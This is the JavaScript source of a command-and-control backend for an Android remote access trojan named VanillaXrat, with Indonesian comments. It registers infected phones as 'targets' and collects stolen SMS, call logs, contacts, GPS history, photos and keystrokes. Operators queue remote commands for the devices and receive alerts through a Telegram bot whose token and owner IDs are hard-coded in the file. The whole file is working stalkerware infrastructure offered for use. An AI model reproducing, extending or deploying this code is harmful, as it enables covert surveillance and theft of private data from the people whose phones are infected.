const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const os = require('os');
const TelegramBot = require('node-telegram-bot-api');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');

const app = express();

// ==================== KONFIGURASI ====================
const PORT = process.env.PORT || 3043;
const BACKEND_URL = process.env.RAILWAY_PUBLIC_DOMAIN 
    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
    : process.env.RENDER_EXTERNAL_URL 
        ? process.env.RENDER_EXTERNAL_URL
        : `http://localhost:${PORT}`;

const FRONTEND_URLS = [
    'https://vanillaxrat.vercel.app',
    'https://vanillaxrat.vercel.app/',
    process.env.FRONTEND_URL,
    'http://localhost:3000',
    'http://127.0.0.1:3000'
].filter(Boolean);

const config = {
    BOT_TOKEN: "8540103972:AAF7Mmh_Z8ZPkNoEVXCzNIgSiMBtOHVH8Iw",
    OWNER_IDS: ["6614829903", "8525870979"],
    ADMIN: "@UpinXD",
    CHANNEL: "@jastebcahnom",
    BOT_NAME: "VanillaXratBot"
};

// ==================== MIDDLEWARE ====================
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());

app.use(cors({
    origin: function(origin, callback) {
        if (!origin) return callback(null, true);
        if (FRONTEND_URLS.includes(origin) || origin.includes('vercel.app') || origin.includes('localhost')) {
            callback(null, true);
        } else {
            callback(null, true); // Biar fleksibel
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Cookie']
}));

// ==================== DATABASE FUNCTIONS ====================
const DB_PATH = path.join(__dirname, 'database');

function ensureDatabase() {
    if (!fs.existsSync(DB_PATH)) fs.mkdirSync(DB_PATH, { recursive: true });
    if (!fs.existsSync(path.join(DB_PATH, 'emails.json'))) {
        fs.writeFileSync(path.join(DB_PATH, 'emails.json'), JSON.stringify({ emails: [] }, null, 2));
    }
    if (!fs.existsSync(path.join(DB_PATH, 'targets.json'))) {
        fs.writeFileSync(path.join(DB_PATH, 'targets.json'), JSON.stringify({ targets: [] }, null, 2));
    }
    if (!fs.existsSync(path.join(DB_PATH, 'activities.json'))) {
        fs.writeFileSync(path.join(DB_PATH, 'activities.json'), JSON.stringify({ activities: [] }, null, 2));
    }
}
ensureDatabase();

function readEmails() {
    try {
        return JSON.parse(fs.readFileSync(path.join(DB_PATH, 'emails.json'), 'utf8'));
    } catch { return { emails: [] }; }
}

function writeEmails(data) {
    fs.writeFileSync(path.join(DB_PATH, 'emails.json'), JSON.stringify(data, null, 2));
}

function readTargets() {
    try {
        return JSON.parse(fs.readFileSync(path.join(DB_PATH, 'targets.json'), 'utf8'));
    } catch { return { targets: [] }; }
}

function writeTargets(data) {
    fs.writeFileSync(path.join(DB_PATH, 'targets.json'), JSON.stringify(data, null, 2));
}

function readActivities() {
    try {
        return JSON.parse(fs.readFileSync(path.join(DB_PATH, 'activities.json'), 'utf8'));
    } catch { return { activities: [] }; }
}

function writeActivities(data) {
    const activities = data.activities.slice(0, 500);
    fs.writeFileSync(path.join(DB_PATH, 'activities.json'), JSON.stringify({ activities }, null, 2));
}

function addActivity(email, title, description, type = 'info') {
    const data = readActivities();
    data.activities.unshift({
        id: Date.now(),
        email,
        title,
        description,
        type,
        timestamp: new Date().toISOString()
    });
    writeActivities(data);
}

function generateKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let key = '';
    for (let i = 0; i < 12; i++) {
        key += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return key;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// ==================== TELEGRAM BOT ====================
let bot;
try {
    bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
    console.log('🤖 Telegram Bot aktif');
} catch (error) {
    console.log('⚠️ Telegram Bot error:', error.message);
}

if (bot) {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId,
            `🔥 *VANILLAXRAT BOT* 🔥\n\n` +
            `Backend: ${BACKEND_URL}\n` +
            `Admin: ${config.ADMIN}\n` +
            `Channel: ${config.CHANNEL}\n\n` +
            `*Commands:*\n` +
            `/add email@example.com - Register email\n` +
            `/list - List all emails\n` +
            `/key email@example.com - Get API key\n` +
            `/stats - Bot statistics\n` +
            `/targets - List all targets\n` +
            `/broadcast message - Send to all users`,
            { parse_mode: 'Markdown' }
        );
    });

    bot.onText(/\/add (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        const email = match[1].toLowerCase().trim();

        if (!email.includes('@') || !email.includes('.')) {
            return bot.sendMessage(chatId, '❌ Email tidak valid!');
        }

        const data = readEmails();
        
        if (data.emails.find(e => e.email === email)) {
            return bot.sendMessage(chatId, `⚠️ Email ${email} sudah terdaftar!`);
        }

        const newKey = generateKey();
        
        data.emails.push({
            email: email,
            key: newKey,
            created_at: new Date().toISOString(),
            verified: true,
            registered_by: msg.from.id,
            username: msg.from.username
        });
        
        writeEmails(data);
        addActivity(email, 'New Registration', `Email ${email} registered via Telegram`, 'success');

        bot.sendMessage(chatId,
            `✅ *EMAIL TERDAFTAR!*\n\n` +
            `Email: ${email}\n` +
            `Key: \`${newKey}\`\n` +
            `Dashboard: ${FRONTEND_URLS[0]}\n\n` +
            `_Simpan key ini untuk mengaktifkan target_`,
            { parse_mode: 'Markdown' }
        );
    });

    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        const data = readEmails();

        if (data.emails.length === 0) {
            return bot.sendMessage(chatId, '📭 Belum ada email terdaftar.');
        }

        let text = '📧 *DAFTAR EMAIL:*\n\n';
        data.emails.forEach((e, i) => {
            text += `${i+1}. ${e.email}\n   Key: \`${e.key}\`\n   Created: ${new Date(e.created_at).toLocaleDateString()}\n\n`;
        });

        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/key (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        const email = match[1].toLowerCase().trim();

        const data = readEmails();
        const user = data.emails.find(e => e.email === email);

        if (!user) {
            return bot.sendMessage(chatId, '❌ Email tidak terdaftar!');
        }

        bot.sendMessage(chatId, `🔑 *KEY:* \`${user.key}\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, (msg) => {
        const chatId = msg.chat.id;
        const emailData = readEmails();
        const targetData = readTargets();
        
        const totalUser = emailData.emails.length;
        const totalTarget = targetData.targets.length;
        const onlineTarget = targetData.targets.filter(t => t.status === 'online').length;
        const totalDataStolen = targetData.targets.reduce((sum, t) => sum + (t.data_stolen || 0), 0);
        
        bot.sendMessage(chatId,
            `📊 *STATISTIK BOT*\n\n` +
            `Total User: ${totalUser}\n` +
            `Total Target: ${totalTarget}\n` +
            `Target Online: ${onlineTarget}\n` +
            `Data Stolen: ${formatBytes(totalDataStolen)}\n` +
            `Backend: ${BACKEND_URL}`,
            { parse_mode: 'Markdown' }
        );
    });

    bot.onText(/\/targets/, (msg) => {
        const chatId = msg.chat.id;
        const targetData = readTargets();
        
        if (targetData.targets.length === 0) {
            return bot.sendMessage(chatId, '📭 Belum ada target.');
        }
        
        let text = '📱 *TARGET LIST:*\n\n';
        targetData.targets.slice(0, 15).forEach((t, i) => {
            text += `${i+1}. ${t.device_name || 'Unknown'}\n   Status: ${t.status}\n   Phone: ${t.phone || 'Unknown'}\n   Data: ${formatBytes(t.data_stolen || 0)}\n\n`;
        });
        
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/broadcast (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (!config.OWNER_IDS.includes(msg.from.id.toString())) {
            return bot.sendMessage(chatId, '⛔ Only owner can broadcast');
        }
        
        const message = match[1];
        const emailData = readEmails();
        
        let sent = 0;
        emailData.emails.forEach(user => {
            bot.sendMessage(user.registered_by, `📢 *BROADCAST:*\n\n${message}`, { parse_mode: 'Markdown' }).catch(() => {});
            sent++;
        });
        
        bot.sendMessage(chatId, `✅ Broadcast sent to ${sent} users`);
    });
}

// ==================== API ENDPOINTS ====================

app.get('/', (req, res) => {
    res.json({
        name: 'VanillaXrat Backend',
        version: '2.0.0',
        status: 'online',
        backend_url: BACKEND_URL,
        frontend_url: FRONTEND_URLS[0],
        admin: config.ADMIN,
        endpoints: [
            '/api/health',
            '/api/login',
            '/api/check',
            '/api/user',
            '/api/targets',
            '/api/target/:id',
            '/api/target/data',
            '/api/register_target',
            '/api/target/heartbeat',
            '/api/regenerate-key',
            '/api/activities',
            '/api/logout'
        ]
    });
});

app.get('/api/health', (req, res) => {
    const targetData = readTargets();
    res.json({
        status: 'online',
        timestamp: Date.now(),
        uptime: process.uptime(),
        targets: targetData.targets.length,
        online_targets: targetData.targets.filter(t => t.status === 'online').length,
        backend_url: BACKEND_URL,
        version: '2.0.0'
    });
});

app.post('/api/login', (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.json({ success: false, message: 'Email wajib diisi!' });
    }

    const cleanEmail = email.toLowerCase().trim();
    const emailData = readEmails();
    const user = emailData.emails.find(e => e.email === cleanEmail);

    if (!user) {
        return res.json({ success: false, message: 'Email belum terdaftar! Hubungi @UpinXD' });
    }

    res.cookie('vanilla_email', cleanEmail, { 
        maxAge: 7 * 24 * 60 * 60 * 1000, 
        httpOnly: true,
        sameSite: 'none',
        secure: true,
        path: '/'
    });
    
    res.cookie('vanilla_key', user.key, { 
        maxAge: 7 * 24 * 60 * 60 * 1000, 
        httpOnly: true,
        sameSite: 'none',
        secure: true,
        path: '/'
    });

    addActivity(cleanEmail, 'User Login', `Logged in from ${req.ip}`, 'info');

    res.json({
        success: true,
        message: 'Login berhasil!',
        email: cleanEmail,
        key: user.key
    });
});

app.get('/api/check', (req, res) => {
    const userEmail = req.cookies.vanilla_email;
    const userKey = req.cookies.vanilla_key;

    if (userEmail && userKey) {
        const emailData = readEmails();
        const valid = emailData.emails.find(e => e.email === userEmail && e.key === userKey);
        if (valid) {
            return res.json({ loggedIn: true, email: userEmail, key: userKey });
        }
    }
    res.json({ loggedIn: false });
});

app.get('/api/user', (req, res) => {
    const userEmail = req.cookies.vanilla_email;
    const userKey = req.cookies.vanilla_key;
    
    if (!userEmail || !userKey) {
        return res.json({ success: false, message: 'Not logged in' });
    }
    
    const emailData = readEmails();
    const user = emailData.emails.find(e => e.email === userEmail && e.key === userKey);
    
    if (!user) {
        return res.json({ success: false, message: 'Invalid session' });
    }
    
    res.json({
        success: true,
        user: {
            email: userEmail,
            role: config.OWNER_IDS.includes(user?.registered_by?.toString()) ? 'Owner' : 'User',
            created_at: user?.created_at || new Date().toISOString(),
            key: user.key
        }
    });
});

app.get('/api/targets', (req, res) => {
    const userKey = req.cookies.vanilla_key;
    
    if (!userKey) {
        return res.json({ success: false, message: 'Not logged in' });
    }

    const targetsData = readTargets();
    const userTargets = targetsData.targets.filter(t => t.owner_key === userKey).map(t => ({
        id: t.id,
        device_name: t.device_name,
        phone: t.phone || 'Unknown',
        status: t.status,
        battery: t.battery || 0,
        location: t.location || 'Unknown',
        last_seen: t.last_seen,
        sms_count: t.sms_data?.length || 0,
        photos_count: t.photos_data?.length || 0,
        data_stolen: t.data_stolen || 0,
        network: t.network || 'N/A',
        ip: t.ip || 'N/A'
    }));
    
    res.json({ success: true, targets: userTargets });
});

app.get('/api/target/:id', (req, res) => {
    const userKey = req.cookies.vanilla_key;
    const targetId = req.params.id;

    if (!userKey) {
        return res.json({ success: false, message: 'Not logged in' });
    }

    const targetsData = readTargets();
    const target = targetsData.targets.find(t => t.id === targetId && t.owner_key === userKey);

    if (!target) {
        return res.json({ success: false, message: 'Target not found' });
    }

    res.json({ success: true, target });
});

app.post('/api/register_target', (req, res) => {
    const { key, device, device_type, permissions, location, phone, targetId, battery, network } = req.body;
    
    if (!key) {
        return res.json({ success: false, message: 'Key diperlukan!' });
    }
    
    const emailData = readEmails();
    const validUser = emailData.emails.find(e => e.key === key);
    
    if (!validUser) {
        return res.json({ success: false, message: 'Key tidak valid!' });
    }
    
    const targetsData = readTargets();
    const newTargetId = targetId || 'tgt_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();
    
    const existingTarget = targetsData.targets.find(t => t.id === newTargetId);
    
    if (existingTarget) {
        existingTarget.status = 'online';
        existingTarget.last_seen = timestamp;
        existingTarget.lastHeartbeat = Date.now();
        existingTarget.ip = clientIp;
        existingTarget.location = location || existingTarget.location;
        existingTarget.battery = battery || existingTarget.battery;
        existingTarget.network = network || existingTarget.network;
        
        writeTargets(targetsData);
        
        return res.json({ success: true, message: 'Target updated', target_id: existingTarget.id });
    }
    
    const newTarget = {
        id: newTargetId,
        owner_key: key,
        owner_email: validUser.email,
        device_name: device || 'Unknown Android',
        device_type: device_type || 'android',
        phone: phone || 'Unknown',
        status: 'online',
        first_seen: timestamp,
        last_seen: timestamp,
        lastHeartbeat: Date.now(),
        ip: clientIp,
        location: location || 'Unknown',
        battery: battery || 100,
        network: network || 'WiFi',
        permissions: permissions || {
            camera: false,
            mic: false,
            storage: true,
            location: false,
            contacts: false,
            sms: false
        },
        data_stolen: 0,
        sms_data: [],
        calls_data: [],
        contacts_data: [],
        photos_data: [],
        gps_history: [],
        keylogs_data: []
    };
    
    targetsData.targets.push(newTarget);
    writeTargets(targetsData);
    
    addActivity(validUser.email, 'New Target', `${device} connected with key ${key}`, 'success');
    
    if (bot) {
        config.OWNER_IDS.forEach(ownerId => {
            bot.sendMessage(ownerId, `🎯 *NEW TARGET!*\n\nDevice: ${device}\nPhone: ${phone}\nKey: ${key}\nIP: ${clientIp}`, { parse_mode: 'Markdown' }).catch(() => {});
        });
    }
    
    res.json({ success: true, message: 'Target registered', target_id: newTargetId });
});

app.post('/api/target/data', (req, res) => {
    const { targetId, dataType, data, key } = req.body;
    
    if (!targetId || !dataType) {
        return res.json({ success: false, message: 'Missing fields' });
    }
    
    const targetsData = readTargets();
    const targetIndex = targetsData.targets.findIndex(t => t.id === targetId);
    
    if (targetIndex === -1) {
        return res.json({ success: false, message: 'Target not found' });
    }
    
    const target = targetsData.targets[targetIndex];
    
    switch(dataType) {
        case 'sms':
            if (!target.sms_data) target.sms_data = [];
            target.sms_data.unshift({ ...data, received_at: new Date().toISOString() });
            target.sms_data = target.sms_data.slice(0, 500);
            target.data_stolen = (target.data_stolen || 0) + JSON.stringify(data).length;
            break;
        case 'call':
            if (!target.calls_data) target.calls_data = [];
            target.calls_data.unshift({ ...data, received_at: new Date().toISOString() });
            target.calls_data = target.calls_data.slice(0, 500);
            break;
        case 'contact':
            if (!target.contacts_data) target.contacts_data = [];
            if (!target.contacts_data.find(c => c.phone === data.phone)) {
                target.contacts_data.push({ ...data, received_at: new Date().toISOString() });
            }
            break;
        case 'gps':
            if (!target.gps_history) target.gps_history = [];
            target.gps_history.unshift({ ...data, received_at: new Date().toISOString() });
            target.gps_history = target.gps_history.slice(0, 100);
            target.location = data.address || `${data.lat},${data.lng}`;
            break;
        case 'photo':
            if (!target.photos_data) target.photos_data = [];
            target.photos_data.unshift({ ...data, received_at: new Date().toISOString() });
            target.photos_data = target.photos_data.slice(0, 200);
            target.data_stolen = (target.data_stolen || 0) + (data.size || 0);
            break;
        case 'keylog':
            if (!target.keylogs_data) target.keylogs_data = [];
            target.keylogs_data.push({ ...data, received_at: new Date().toISOString() });
            target.keylogs_data = target.keylogs_data.slice(-1000);
            break;
        case 'permission':
            target.permissions[data.permission] = data.status === 'granted';
            break;
        case 'heartbeat':
            target.lastHeartbeat = Date.now();
            target.status = 'online';
            target.last_seen = new Date().toISOString();
            if (data.battery) target.battery = data.battery;
            if (data.network) target.network = data.network;
            if (data.location) target.location = data.location;
            break;
    }
    
    writeTargets(targetsData);
    res.json({ success: true });
});

app.post('/api/target/heartbeat', (req, res) => {
    const { targetId, battery, network, location, phone } = req.body;
    
    const targetsData = readTargets();
    const targetIndex = targetsData.targets.findIndex(t => t.id === targetId);
    
    if (targetIndex !== -1) {
        targetsData.targets[targetIndex].lastHeartbeat = Date.now();
        targetsData.targets[targetIndex].status = 'online';
        targetsData.targets[targetIndex].last_seen = new Date().toISOString();
        if (battery) targetsData.targets[targetIndex].battery = battery;
        if (network) targetsData.targets[targetIndex].network = network;
        if (location) targetsData.targets[targetIndex].location = location;
        if (phone) targetsData.targets[targetIndex].phone = phone;
        
        writeTargets(targetsData);
        res.json({ success: true });
    } else {
        res.json({ success: false, message: 'Target not found' });
    }
});

app.post('/api/target/command', (req, res) => {
    const { targetId, command, ...params } = req.body;
    
    const targetsData = readTargets();
    const target = targetsData.targets.find(t => t.id === targetId);
    
    if (!target) {
        return res.json({ success: false, message: 'Target not found' });
    }
    
    // Simpan command untuk diambil target nanti
    if (!target.pending_commands) target.pending_commands = [];
    target.pending_commands.push({
        id: Date.now(),
        command,
        params,
        sent_at: new Date().toISOString(),
        status: 'pending'
    });
    
    writeTargets(targetsData);
    
    addActivity(target.owner_email, 'Command Sent', `${command} sent to ${target.device_name}`, 'info');
    
    res.json({ success: true, message: 'Command queued' });
});

app.get('/api/target/poll/:id', (req, res) => {
    const targetId = req.params.id;
    
    const targetsData = readTargets();
    const target = targetsData.targets.find(t => t.id === targetId);
    
    if (!target) {
        return res.json({ success: false, message: 'Target not found' });
    }
    
    const commands = target.pending_commands || [];
    target.pending_commands = [];
    
    writeTargets(targetsData);
    
    res.json({ success: true, commands });
});

app.post('/api/regenerate-key', (req, res) => {
    const userEmail = req.cookies.vanilla_email;
    const userKey = req.cookies.vanilla_key;
    
    if (!userEmail || !userKey) {
        return res.json({ success: false, message: 'Not logged in' });
    }
    
    const emailData = readEmails();
    const userIndex = emailData.emails.findIndex(e => e.email === userEmail && e.key === userKey);
    
    if (userIndex === -1) {
        return res.json({ success: false, message: 'Invalid session' });
    }
    
    const newKey = generateKey();
    emailData.emails[userIndex].key = newKey;
    writeEmails(emailData);
    
    res.cookie('vanilla_key', newKey, { 
        maxAge: 7 * 24 * 60 * 60 * 1000, 
        httpOnly: true,
        sameSite: 'none',
        secure: true
    });
    
    addActivity(userEmail, 'API Key Regenerated', 'New API key generated', 'warning');
    
    res.json({ success: true, key: newKey });
});

app.get('/api/activities', (req, res) => {
    const userEmail = req.cookies.vanilla_email;
    
    if (!userEmail) {
        return res.json({ success: false, message: 'Not logged in' });
    }
    
    const activities = readActivities();
    const userActivities = activities.activities.filter(a => a.email === userEmail).slice(0, 100);
    
    res.json({ success: true, activities: userActivities });
});

app.post('/api/logout', (req, res) => {
    res.clearCookie('vanilla_email', { path: '/' });
    res.clearCookie('vanilla_key', { path: '/' });
    res.json({ success: true });
});

// ==================== CHECK OFFLINE TARGETS ====================
setInterval(() => {
    const now = Date.now();
    const targetsData = readTargets();
    let changed = false;
    
    targetsData.targets.forEach(target => {
        if (target.status === 'online') {
            if (!target.lastHeartbeat || now - target.lastHeartbeat > 90000) {
                target.status = 'offline';
                target.offline_since = new Date().toISOString();
                changed = true;
                console.log(`📴 Target ${target.id} offline`);
            }
        }
    });
    
    if (changed) {
        writeTargets(targetsData);
    }
}, 30000);

// ==================== START SERVER ====================
app.listen(PORT, '0.0.0.0', () => {
    console.log('🔥 VANILLAXRAT BACKEND v2.0');
    console.log(`📡 Port: ${PORT}`);
    console.log(`🌐 Backend URL: ${BACKEND_URL}`);
    console.log(`📱 Frontend URL: ${FRONTEND_URLS[0]}`);
    console.log(`🤖 Bot: ${config.BOT_NAME}`);
    console.log(`👤 Admin: ${config.ADMIN}`);
    console.log('✅ Server running');
});
